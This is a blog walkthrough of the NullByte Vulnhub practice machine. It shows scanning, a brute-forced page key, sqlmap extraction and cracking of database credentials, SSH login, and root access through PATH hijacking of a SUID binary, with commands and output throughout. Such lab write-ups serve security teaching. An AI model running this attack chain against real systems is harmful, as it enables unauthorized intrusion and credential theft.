<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="NULLBYTE - Vulnhub Walkthrough" /><meta property="og:locale" content="en_US" /><meta name="description" content="Description Codename: NB0x01" /><meta property="og:description" content="Description Codename: NB0x01" /><link rel="canonical" href="http://maaelhamid.github.io/posts/NULLBYTE/" /><meta property="og:url" content="http://maaelhamid.github.io/posts/NULLBYTE/" /><meta property="og:site_name" content="Mohamed Ayman" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-13T10:35:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="NULLBYTE - Vulnhub Walkthrough" /><meta name="twitter:site" content="@MAAelHamid" /><meta name="google-site-verification" content="google-site-verification" /> <script type="application/ld+json"> {"description":"Description Codename: NB0x01","headline":"NULLBYTE - Vulnhub Walkthrough","url":"http://maaelhamid.github.io/posts/NULLBYTE/","@type":"BlogPosting","dateModified":"2021-08-13T10:35:00+02:00","datePublished":"2021-08-13T10:35:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://maaelhamid.github.io/posts/NULLBYTE/"},"@context":"https://schema.org"}</script><title>NULLBYTE - Vulnhub Walkthrough | Mohamed Ayman</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mohamed Ayman"><meta name="application-name" content="Mohamed Ayman"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://maaelhamid.github.io/assets/img/profile/av.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mohamed Ayman</a></div><div class="site-subtitle font-italic">Offensive Security Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/MAAelHamid" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/MAAelHamid" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['m.a.a.elhamid','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>NULLBYTE - Vulnhub Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>NULLBYTE - Vulnhub Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Mohamed Ayman </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Aug 13, 2021, 10:35 AM +0200" prep="on" > Aug 13 <i class="unloaded">2021-08-13T10:35:00+02:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1171 words">6 min</span></div></div><div class="post-content"><h1 id="description">Description</h1><p>Codename: NB0x01</p><p>Download: ly0n.me/nullbyte/NullByte.ova.zip</p><p>Objetcive: Get to /root/proof.txt and follow the instructions.</p><p>Level: Basic to intermediate.</p><p>Description: Boot2root, box will get IP from dhcp, works fine with virtualbox&amp;vmware.</p><p>Hints: Use your lateral thinking skills, maybe you’ll need to write some code.</p><h1 id="init">INIT</h1><p>identify target IP</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">➜  ~ nmap -sP 172.16.129.128/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 11:48 EDT
Nmap scan report for Home (172.16.129.1)
Host is up (0.00056s latency).
Nmap scan report for 172.16.129.2
Host is up (0.00033s latency).
Nmap scan report for 172.16.129.128
Host is up (0.0011s latency).
Nmap scan report for 172.16.129.141
Host is up (0.0010s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.35 seconds
</span></pre></table></code></div></div><p>edit <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file (local DNS)</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Vulnhub
<span class="go">172.16.129.141  nullbyte.vuln
</span></pre></table></code></div></div><p>lets starting …</p><h1 id="scanning">Scanning</h1><h3 id="nmap">Nmap</h3><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="go">➜  ~ sudo nmap -A -p- -T4 nullbyte.vuln
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 11:51 EDT
Nmap scan report for nullbyte.vuln (172.16.129.141)
Host is up (0.0014s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
</span><span class="gp">111/tcp   open  rpcbind 2-4 (RPC #</span>100000<span class="o">)</span>
<span class="go">| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34372/tcp6  status
|   100024  1          45260/tcp   status
|   100024  1          53470/udp6  status
|_  100024  1          58576/udp   status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
</span><span class="gp">45260/tcp open  status  1 (RPC #</span>100024<span class="o">)</span>
<span class="go">MAC Address: 00:0C:29:72:55:45 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
TRACEROUTE
HOP RTT     ADDRESS
1   1.42 ms nullbyte.vuln (172.16.129.141)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.42 seconds
</span></pre></table></code></div></div><h1 id="enumeration">Enumeration</h1><h2 id="port-80">port 80</h2><p>landing page</p><p><img data-proofer-ignore data-src="/assets/2021-08-13-NULLBYTE.assets/image-20210813180703286.png" alt="image-20210813180703286" /></p><h2 id="whatweb">Whatweb</h2><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">➜  ~ sudo whatweb nullbyte.vuln
http://nullbyte.vuln [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[172.16.129.141], Title[Null Byte 00 - level 1]
</span></pre></table></code></div></div><h2 id="check-directory">Check directory</h2><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="go">➜  ~  gobuster dir -u http://nullbyte.vuln -w /usr/share/wordlists/dirb/big.txt 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nullbyte.vuln
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/13 11:56:52 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
</span><span class="gp">/javascript           (Status: 301) [Size: 319] [--&gt;</span><span class="w"> </span>http://nullbyte.vuln/javascript/]
<span class="gp">/phpmyadmin           (Status: 301) [Size: 319] [--&gt;</span><span class="w"> </span>http://nullbyte.vuln/phpmyadmin/]
<span class="go">/server-status        (Status: 403) [Size: 301]                                       
</span><span class="gp">/uploads              (Status: 301) [Size: 316] [--&gt;</span><span class="w"> </span>http://nullbyte.vuln/uploads/]   
<span class="go">                                                                                      
===============================================================
2021/08/13 11:56:57 Finished
===============================================================
</span></pre></table></code></div></div><p>This challenge is CTF style …</p><h2 id="img-metadata">IMG Metadata</h2><p>lets check metadata of landing page image</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="go">➜  ~ curl http://nullbyte.vuln/main.gif -o img | exiftool img  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16647  100 16647    0     0  2709k      0 --:--:-- --:--:-- --:--:-- 2709k
ExifTool Version Number         : 12.16
File Name                       : img
Directory                       : .
File Size                       : 16 KiB
File Modification Date/Time     : 2021:08:13 14:31:44-04:00
File Access Date/Time           : 2021:08:13 14:31:44-04:00
File Inode Change Date/Time     : 2021:08:13 14:31:44-04:00
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
</span></pre></table></code></div></div><p>this line is interesting</p><p><code class="language-plaintext highlighter-rouge">Comment : P-): kzMb5nVYJw</code></p><p><img data-proofer-ignore data-src="/assets/2021-08-13-NULLBYTE.assets/image-20210813180913716.png" alt="image-20210813180913716" /></p><p>intercept this page</p><p><img data-proofer-ignore data-src="/assets/2021-08-13-NULLBYTE.assets/image-20210813203246943.png" alt="image-20210813203246943" /></p><p>brute forcing the only way</p><h1 id="exploiting">Exploiting</h1><h2 id="brute-forcing-key">Brute forcing key</h2><p>go for burp intruder</p><p><img data-proofer-ignore data-src="/assets/2021-08-13-NULLBYTE.assets/image-20210813203446291.png" alt="image-20210813203446291" /></p><p>for payload i will use Seclists <code class="language-plaintext highlighter-rouge">SecLists/Passwords/Common-Credentials/10k-most-common.txt</code></p><p><img data-proofer-ignore data-src="/assets/2021-08-13-NULLBYTE.assets/image-20210813203846851.png" alt="image-20210813203846851" /></p><p><strong>elite</strong> is the key</p><p><img data-proofer-ignore data-src="/assets/2021-08-13-NULLBYTE.assets/image-20210813204050063.png" alt="image-20210813204050063" /></p><p>press <code class="language-plaintext highlighter-rouge">&lt;enter_key&gt;</code> only <em>empty input</em></p><p><img data-proofer-ignore data-src="/assets/2021-08-13-NULLBYTE.assets/image-20210813204203052.png" alt="image-20210813204203052" /></p><h2 id="sqlmap">SQLmap</h2><p>SQLmap against this input field</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>identify DB
<span class="go">➜  ~ sqlmap -u 'http://nullbyte.vuln/kzMb5nVYJw/420search.php?usrtosearch=x' --dbs
. . .
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] seth
. . .
</span></pre></table></code></div></div><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>dump data
<span class="go">➜  ~ sqlmap -u 'http://nullbyte.vuln/kzMb5nVYJw/420search.php?usrtosearch=' --batch  --dump -C User,Password -T user -D mysqlBB
. . .
+------------------+-------------------------------------------------------+
| User             | Password                                              |
+------------------+-------------------------------------------------------+
| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) |
| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) |
| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) |
| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) |
| debian-sys-maint | *BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC             |
| phpmyadmin       | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) |
+------------------+-------------------------------------------------------+
. . .
</span></pre></table></code></div></div><p><strong>Remember</strong></p><p>we have <code class="language-plaintext highlighter-rouge">/phpmyadmin</code> directory gobuster output</p><p>Credentials : <code class="language-plaintext highlighter-rouge">root:sunnyvale</code></p><h2 id="phpmyadmin">phpMyAdmin</h2><p><img data-proofer-ignore data-src="/assets/2021-08-13-NULLBYTE.assets/image-20210813205310479.png" alt="image-20210813205310479" /></p><p>dive to Database: seth Table: users</p><p><img data-proofer-ignore data-src="/assets/2021-08-13-NULLBYTE.assets/image-20210813205509324.png" alt="image-20210813205509324" /></p><p>Credentials : <code class="language-plaintext highlighter-rouge">ramses</code> pass is hashed lets crack it :)</p><p><code class="language-plaintext highlighter-rouge">YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE</code></p><p>decode base64</p><p><code class="language-plaintext highlighter-rouge">c6d6bd7ebf806f43c76acc3681703b81</code></p><p>crack the hash</p><p><code class="language-plaintext highlighter-rouge">omega</code> <em>i used <a href="https://hashes.com/en/decrypt/hash">hashes.com</a> for hole process</em></p><p>Credentials : <code class="language-plaintext highlighter-rouge">ramses:omega</code></p><h2 id="ssh-connection">SSH Connection</h2><p>now lets connect to machine using SSH <em>port 777</em></p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">➜  ~ ssh ramses@nullbyte.vuln -p 777
The authenticity of host '[nullbyte.vuln]:777 ([172.16.129.141]:777)' can't be established.
ECDSA key fingerprint is SHA256:H/Y/TKggtnCfMGz457Jy6F6tUZPrvEDD62dP9A3ZIkU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[nullbyte.vuln]:777,[172.16.129.141]:777' (ECDSA) to the list of known hosts.
ramses@nullbyte.vuln's password: 

</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
</span><span class="gp">ramses@NullByte:~$</span><span class="w">
</span></pre></table></code></div></div><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Regular User Account Access</ul><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="suid-binary">SUID binary</h2><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">ramses@NullByte:/var/www/backup$</span><span class="w"> </span>find / <span class="nt">-uid</span> 0 <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
<span class="go">/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/procmail
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/sbin/exim4
/var/www/backup/procwatch
/bin/su
/bin/mount
/bin/umount
/sbin/mount.nfs
</span></pre></table></code></div></div><p>this file looks … interesting :joy: <code class="language-plaintext highlighter-rouge">/var/www/backup/procwatch</code> lets take a look …</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">ramses@NullByte:/var/www/backup$</span><span class="w"> </span>./procwatch
<span class="go">  PID TTY          TIME CMD
 1487 pts/0    00:00:00 procwatch
 1488 pts/0    00:00:00 sh
 1489 pts/0    00:00:00 ps
</span></pre></table></code></div></div><p>this file trigger <code class="language-plaintext highlighter-rouge">ps</code> command lets abuse it</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">ramses@NullByte:/var/www/backup$</span><span class="w"> </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/var/www/backup:<span class="nv">$PATH</span>
<span class="gp">ramses@NullByte:/var/www/backup$</span><span class="w"> </span><span class="nb">touch </span>ps
<span class="gp">ramses@NullByte:/var/www/backup$</span><span class="w">  </span><span class="nb">echo</span> <span class="s1">'/bin/sh -i'</span> <span class="o">&gt;</span> ps
<span class="gp">ramses@NullByte:/var/www/backup$</span><span class="w"> </span><span class="nb">chmod </span>777 ps
<span class="gp">ramses@NullByte:/var/www/backup$</span><span class="w"> </span>./procwatch
<span class="gp">#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span></pre></table></code></div></div><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Root User Account Access</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vlunhub/'>VlunHub</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a> <a href="/tags/escalate-my-privileges/" class="post-tag no-text-decoration" >ESCALATE_MY_PRIVILEGES</a> <a href="/tags/privilege-escalation/" class="post-tag no-text-decoration" >privilege_escalation</a> <a href="/tags/suid/" class="post-tag no-text-decoration" >SUID</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=NULLBYTE - Vulnhub Walkthrough - Mohamed Ayman&url=http://maaelhamid.github.io/posts/NULLBYTE/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=NULLBYTE - Vulnhub Walkthrough - Mohamed Ayman&u=http://maaelhamid.github.io/posts/NULLBYTE/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=NULLBYTE - Vulnhub Walkthrough - Mohamed Ayman&url=http://maaelhamid.github.io/posts/NULLBYTE/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Bypass-30X-redirect-with-BurpSuite/">Bypass 30X redirect with BurpSuite</a><li><a href="/posts/TOPPO/">TOPPO - Vulnhub Walkthrough</a><li><a href="/posts/ESCALATE-LINUX/">ESCALATE LINUX - Vulnhub Walkthrough</a><li><a href="/posts/KIOPTRIX_LEVEL_1/">KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough</a><li><a href="/posts/KIOPTRIX_LEVEL_1.1/">KIOPTRIX LEVEL 1.1 (#2) - Vulnhub Walkthrough</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege_escalation</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/kioptrix/">kioptrix</a> <a class="post-tag" href="/tags/escalate-my-privileges/">ESCALATE_MY_PRIVILEGES</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/30x/">30x</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/ESCALATE-LINUX/"><div class="card-body"> <span class="timeago small" > Aug 12 <i class="unloaded">2021-08-12T05:35:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ESCALATE LINUX - Vulnhub Walkthrough</h3><div class="text-muted small"><p> Description Escalate_Linux - A intentionally developed Linux vulnerable virtual machine.The main focus of this machine is to learn Linux Post Exploitation (Privilege Escalation) Techniques. INIT ...</p></div></div></a></div><div class="card"> <a href="/posts/ESCALATE-MY-PRIVILEGES/"><div class="card-body"> <span class="timeago small" > Aug 13 <i class="unloaded">2021-08-13T05:35:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ESCALATE MY PRIVILEGES - Vulnhub Walkthrough</h3><div class="text-muted small"><p> INIT identify target IP ➜ ~ nmap -sP 172.16.129.128/24 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 18:52 EDT Nmap scan report for Home (172.16.129.1) Host is up (0.0019s latency). Nmap...</p></div></div></a></div><div class="card"> <a href="/posts/MISDIRECTION/"><div class="card-body"> <span class="timeago small" > Aug 13 <i class="unloaded">2021-08-13T05:35:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ESCALATE MY PRIVILEGES - Vulnhub Walkthrough</h3><div class="text-muted small"><p> INIT identify target IP ➜ ~ nmap -sP 172.16.129.128/24 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 10:52 EDT Nmap scan report for Home (172.16.129.1) Host is up (0.0018s latency). Nmap...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/MISDIRECTION/" class="btn btn-outline-primary" prompt="Older"><p>ESCALATE MY PRIVILEGES - Vulnhub Walkthrough</p></a> <a href="/posts/TOPPO/" class="btn btn-outline-primary" prompt="Newer"><p>TOPPO - Vulnhub Walkthrough</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/maaelhamid">Mohamed Ayman</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege_escalation</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/kioptrix/">kioptrix</a> <a class="post-tag" href="/tags/escalate-my-privileges/">ESCALATE_MY_PRIVILEGES</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/30x/">30x</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 